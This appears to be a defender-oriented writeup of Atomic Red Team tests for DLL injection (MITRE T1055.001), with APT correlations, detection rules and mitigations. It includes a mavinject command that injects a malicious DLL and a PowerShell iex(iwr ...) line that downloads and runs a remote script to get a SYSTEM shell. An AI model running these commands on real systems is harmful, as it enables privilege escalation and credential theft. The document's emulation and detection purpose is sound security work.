# Atomic Red Team Tests for Advanced Threat Actors - T1055.001 Process Injection: Dynamic-link Library Injection

This repository documents **Atomic Red Team tests for T1055.001 (DLL Injection)** that emulate the **defense evasion and privilege escalation** tradecraft of **advanced threat actors** like Russian (APT29), North Korean (Lazarus Group), and Chinese state-sponsored groups.

The goal is to:
* Provide defenders with relevant tests for detecting sophisticated code injection techniques.
* Map the tests to common adversary behaviors and the underlying Windows API abuse.
* Highlight specific techniques used to execute code stealthily and evade security products.

---

## Background

* **Process Injection** is a fundamental technique in the arsenal of advanced persistent threats (APTs). It allows attackers to hide their malicious code within the memory space of a trusted, legitimate process.
* **T1055.001 (DLL Injection)** is one of the most common variants. It involves forcing a process to load a malicious Dynamic-Link Library (DLL), thereby executing the attacker's code under the guise of a legitimate operation.
* This technique is a primary method for **Defense Evasion** (TA0005) and **Privilege Escalation** (TA0004), making it critical for maintaining a stealthy presence on a compromised host.

Advanced threat actors leverage DLL Injection because it allows them to:
* **Evade process-based detection:** Security products may whitelist or less closely monitor common system processes.
* **Gain access to process memory:** This can include stealing credentials from browser memory or the LSASS process.
* **Execute with elevated privileges:** By injecting into a process running as SYSTEM or another high-integrity user.
* **Persistence:** Malicious code can remain resident in memory for long periods without writing to disk.

---

## Selected Atomic Tests for T1055.001

| Test # | Technique | Description | Adversary Relevance |
|--------|-----------|-------------|---------------------|
| **1** | Injection via `mavinject.exe` | Abuses a signed Microsoft utility to perform DLL injection into a target process. | **Living off the Land (LOLBin)** |
| **2** | Injection via `UsoClient` | Abuses the Windows Update Standalone Installer process and its privileged DLL load patterns. | **Privilege Escalation** |

---

## Detailed Test Analysis

### Atomic Test #1 - Process Injection via mavinject.exe
**Technique:** Abuse of LOLBin for Defense Evasion
**Adversary Usage:** Various APTs (Widely Used)
**Command:**
```cmd
mavinject <PID> /INJECTRUNNING "C:\Path\To\Malicious.dll"
```
**Explanation:** This test abuses `mavinject.exe` (Microsoft Application Virtualization Injector), a legitimate Windows tool signed by Microsoft. Attackers use it because it provides a simple, command-line interface to perform DLL injection without writing custom code that directly calls Windows APIs like `VirtualAllocEx` and `CreateRemoteThread`. This is a classic **Living off the Land (LOTL)** technique that helps avoid triggering alerts based on rare API calls.

**APT Correlation:** A common technique used by a wide range of threat actors to inject code into processes like `lsass.exe` for credential dumping or browsers for session theft, all while hiding behind a trusted Microsoft executable.

### Atomic Test #2 - WinPwn - Get SYSTEM shell via UsoClient DLL Load
**Technique:** Abuse of Privileged File Operations for Privilege Escalation
**Adversary Usage:** Various APTs (Privilege Escalation)
**Command:**
```powershell
iex(iwr 'https://raw.githubusercontent.com/.../Get-UsoClientDLLSystem.ps1')
```
**Explanation:** This technique exploits the `UsoClient` (Update Orchestrator Service) process. It involves placing a malicious DLL in a location where a privileged SYSTEM process (`usoclient.exe`) is tricked into loading it. When the process loads the DLL, the malicious code executes with **SYSTEM-level privileges**, providing a direct path to full system compromise. This is more complex and targeted than general injection, often used specifically for privilege escalation.

**APT Correlation:** Demonstrates the depth of knowledge advanced actors have of the Windows OS. Abusing trusted system processes and their DLL search orders is a sophisticated method to gain the highest privileges on a system.

---

## Correlation with Advanced Tradecraft

### Common Characteristics:
* **Abuse of Trusted Processes:** Injecting into processes like `lsass.exe`, `svchost.exe`, `explorer.exe`, or browser processes to blend in with normal system activity.
* **Use of LOLBins:** Leveraging built-in Windows utilities like `mavinject.exe`, `rundll32.exe`, or others to avoid deploying custom tools.
* **Fileless Techniques:** Often, the malicious DLL is written to disk only momentarily before being injected, or is reflectively loaded directly from memory to minimize forensic evidence.

### Technical Implementation (Behind the Scenes):
The atomic tests abstract the complex underlying Windows API calls that all DLL injection ultimately relies on:
1.  **`OpenProcess`**: Obtain a handle to the target process.
2.  **`VirtualAllocEx`**: Allocate memory within the target process's address space.
3.  **`WriteProcessMemory`**: Write the path to the malicious DLL into the allocated memory.
4.  **`CreateRemoteThread`**: Create a new thread in the target process that executes `LoadLibrary`, pointing to the written DLL path.

### Tactical Objectives:
1.  **Defense Evasion (TA0005):** Hide malicious code execution within a legitimate process.
2.  **Privilege Escalation (TA0004):** Execute code in the context of a higher-integrity process (e.g., SYSTEM).
3.  **Credential Access (TA0006):** Inject into `lsass.exe` to harvest credentials from memory.
4.  **Persistence (TA0003):** Maintain long-term access by injecting into a persistent, trusted process.

---

## Defender Notes

* These tests are critical for understanding how attackers evade detection by operating within trusted processes.
* Detection should focus on:
  * **Process Behavior:** Legitimate processes (e.g., `notepad.exe`) performing anomalous actions, such as making network connections or loading DLLs from unusual paths.
  * **API Monitoring:** Rare API call sequences from processes (e.g., `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`).
  * **LOLBin Usage:** Command-line arguments for utilities like `mavinject.exe` that indicate injection (`/INJECTRUNNING`).
  * **DLL Loads:** Monitoring for DLLs being loaded from user writable directories (e.g., `AppData`, `Temp`) into high-integrity system processes.

### Mitigation Strategies:
* **Application Allowlisting:** Use tools like AppLocker or WDAC to restrict which programs can run, potentially blocking the abuse of LOLBins like `mavinject.exe`.
* **Privileged Access Management (PAM):** Limit user privileges to prevent the necessary access for opening handles to other processes.
* **Memory Protections:** Enable security features like **Attack Surface Reduction (ASR) rules** to block Office applications from injecting into other processes and to protect against credential stealing from LSASS.
* **Endpoint Detection and Response (EDR):** Deploy EDR solutions capable of detecting the subtle behavioral patterns of process injection.

## Campaign References

1.  **Various Ransomware Operations:** Use injection to hide encryption routines within trusted processes.
2.  **APT28 (Fancy Bear):** Known to use sophisticated injection techniques for espionage.
3.  **APT29 (Cozy Bear):** Uses a wide variety of injection and in-memory execution techniques for stealth.

## Academic References

1.  MITRE ATT&CK Technique T1055.001 - Process Injection: Dynamic-link Library Injection
2.  Microsoft Docs: "Preventing DLL Injection" and "Process Injection Mitigations"
3.  Elastic: "Hunting in Memory" (2017)
4.  Various cybersecurity intelligence reports on APT tradecraft.

## Detection Recommendations

*   **EDR/SIEM Rules:**
    *   Alert on `mavinject.exe` execution with command-line arguments containing `/INJECTRUNNING`.
    *   Detect the classic injection API sequence (`OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`) from unexpected processes.
    *   Correlate process creation events with subsequent module loads from suspicious locations.
*   **Behavioral Analysis:**
    *   Flag processes that spawn child processes or load DLLs that are highly unusual for their normal function.
    *   Look for named pipes or other inter-process communication (IPC) between unrelated processes.

This test suite provides defenders with the necessary visibility to detect and respond to DLL injection techniques, a critical component of the operational playbook for advanced threat actors seeking to operate stealthily within a compromised environment.